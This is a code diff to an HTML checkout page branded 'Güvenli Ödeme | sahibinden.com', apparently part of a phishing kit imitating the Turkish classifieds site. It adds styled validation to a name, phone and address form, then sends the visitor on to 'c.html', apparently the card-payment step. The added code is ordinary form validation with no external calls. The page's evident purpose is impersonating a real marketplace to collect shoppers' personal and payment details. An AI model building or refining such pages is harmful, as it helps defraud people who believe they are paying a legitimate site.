@@ -5,6 +5,35 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Güvenli Ödeme | sahibinden.com</title>
   <link rel="stylesheet" href="b.css">
+  <style>
+    /* Validation stilleri */
+    .form-group input:invalid,
+    .form-group textarea:invalid {
+      border-color: #e74c3c;
+    }
+    
+    .form-group input:valid,
+    .form-group textarea:valid {
+      border-color: #27ae60;
+    }
+    
+    .error-message {
+      color: #e74c3c;
+      font-size: 12px;
+      margin-top: 5px;
+      display: none;
+    }
+    
+    .form-group.error .error-message {
+      display: block;
+    }
+    
+    .form-group.error input,
+    .form-group.error textarea {
+      border-color: #e74c3c;
+      background-color: #fdf2f2;
+    }
+  </style>
 </head>
 <body>
   <div class="container">
@@ -12,38 +41,80 @@
       <span class="logo">sahibinden.com</span>
       <span class="guvenli">🔒 Güvenli ödeme</span>
     </header>
-
+    
     <div class="main-content">
       <!-- Adres Bilgileri -->
       <div class="card address-card">
         <h2>Adres bilgileri</h2>
-        <div class="form-group">
-          <label>Ad Soyad</label>
-          <input type="text" placeholder="Ad Soyad">
-        </div>
-        <div class="form-group">
-          <label>Telefon</label>
-          <div style="display: flex; align-items: center;">
-            <input type="text" value="+90" readonly style="width: 50px; text-align: center; background-color: #f5f5f5; border: 1px solid #ddd; border-radius: 3px; margin-right: 5px;">
-            <input type="tel" placeholder="Telefon numarası girin" style="flex: 1;">
-          </div>
-        </div>
-        <div class="form-row">
+        
+        <form id="addressForm" novalidate>
           <div class="form-group">
-            <label>İl</label>
-            <input type="text" placeholder="İl">
+            <label>Ad Soyad *</label>
+            <input 
+              type="text" 
+              name="fullName"
+              placeholder="Ad Soyad" 
+              required 
+              minlength="2"
+              pattern="[A-Za-zÇĞıİÖŞÜçğıiöşü\s]+"
+            >
+            <div class="error-message">Lütfen geçerli bir ad soyad girin (en az 2 karakter)</div>
           </div>
+          
           <div class="form-group">
-            <label>İlçe</label>
-            <input type="text" placeholder="İlçe">
+            <label>Telefon *</label>
+            <div style="display: flex; align-items: center;">
+              <input type="text" value="+90" readonly style="width: 50px; text-align: center; background-color: #f5f5f5; border: 1px solid #ddd; border-radius: 3px; margin-right: 5px;">
+              <input 
+                type="tel" 
+                name="phone"
+                placeholder="Telefon numarası girin" 
+                style="flex: 1;" 
+                required
+                minlength="2"
+              >
+            </div>
+            <div class="error-message">Lütfen telefon numarası girin (en az 2 karakter)</div>
           </div>
-        </div>
-        <div class="form-group">
-          <label>Adres</label>
-          <textarea placeholder="Mahalle, cadde, sokak vb. bilgileri girin"></textarea>
-        </div>
+          
+          <div class="form-row">
+            <div class="form-group">
+              <label>İl *</label>
+              <input 
+                type="text" 
+                name="city"
+                placeholder="İl" 
+                required
+                minlength="2"
+              >
+              <div class="error-message">Lütfen il bilgisini girin</div>
+            </div>
+            <div class="form-group">
+              <label>İlçe *</label>
+              <input 
+                type="text" 
+                name="district"
+                placeholder="İlçe" 
+                required
+                minlength="2"
+              >
+              <div class="error-message">Lütfen ilçe bilgisini girin</div>
+            </div>
+          </div>
+          
+          <div class="form-group">
+            <label>Adres *</label>
+            <textarea 
+              name="address"
+              placeholder="Mahalle, cadde, sokak vb. bilgileri girin" 
+              required
+              minlength="2"
+            ></textarea>
+            <div class="error-message">Lütfen adres bilgisini girin (en az 2 karakter)</div>
+          </div>
+        </form>
       </div>
-
+      
       <!-- Sipariş Özeti -->
       <div class="card order-card">
         <h2>Sipariş özeti</h2>
@@ -67,12 +138,96 @@
             <span>4.500,00 TL</span>
           </div>
         </div>
-        <!-- Butona Yönlendirme Eklendi -->
-        <a href="c.html">
-          <button class="pay-button">Kaydet ve ödemeye geç</button>
-        </a>
+        
+        <button type="button" class="pay-button" onclick="validateAndSubmit()">
+          Kaydet ve ödemeye geç
+        </button>
       </div>
     </div>
   </div>
+
+  <script>
+    function validateAndSubmit() {
+      const form = document.getElementById('addressForm');
+      const formGroups = document.querySelectorAll('.form-group');
+      let isValid = true;
+      
+      // Tüm hata mesajlarını temizle
+      formGroups.forEach(group => {
+        group.classList.remove('error');
+      });
+      
+      // Her alanı kontrol et
+      const inputs = form.querySelectorAll('input[required], textarea[required]');
+      
+      inputs.forEach(input => {
+        const formGroup = input.closest('.form-group');
+        
+        if (!input.value.trim()) {
+          formGroup.classList.add('error');
+          isValid = false;
+        } else if (input.type === 'tel') {
+          // Telefon numarası kontrolü - en az 2 karakter
+          if (input.value.trim().length < 2) {
+            formGroup.classList.add('error');
+            isValid = false;
+          }
+        } else if (input.name === 'fullName') {
+          // Ad soyad kontrolü
+          const namePattern = /^[A-Za-zÇĞıİÖŞÜçğıiöşü\s]+$/;
+          if (input.value.trim().length < 2 || !namePattern.test(input.value.trim())) {
+            formGroup.classList.add('error');
+            isValid = false;
+          }
+        } else if (input.name === 'address') {
+          // Adres kontrolü - en az 2 karakter
+          if (input.value.trim().length < 2) {
+            formGroup.classList.add('error');
+            isValid = false;
+          }
+        } else if ((input.name === 'city' || input.name === 'district') && input.value.trim().length < 2) {
+          formGroup.classList.add('error');
+          isValid = false;
+        }
+      });
+      
+      if (isValid) {
+        // Form geçerli, ödeme sayfasına yönlendir
+        window.location.href = 'c.html';
+      } else {
+        // Hata mesajı göster
+        alert('Lütfen tüm zorunlu alanları doğru şekilde doldurun.');
+        
+        // İlk hatalı alana odaklan
+        const firstError = document.querySelector('.form-group.error input, .form-group.error textarea');
+        if (firstError) {
+          firstError.focus();
+        }
+      }
+    }
+    
+    // Gerçek zamanlı validation
+    document.addEventListener('DOMContentLoaded', function() {
+      const inputs = document.querySelectorAll('input[required], textarea[required]');
+      
+      inputs.forEach(input => {
+        input.addEventListener('blur', function() {
+          const formGroup = this.closest('.form-group');
+          
+          if (this.value.trim()) {
+            formGroup.classList.remove('error');
+          }
+        });
+        
+        input.addEventListener('input', function() {
+          const formGroup = this.closest('.form-group');
+          
+          if (this.value.trim()) {
+            formGroup.classList.remove('error');
+          }
+        });
+      });
+    });
+  </script>
 </body>
 </html>
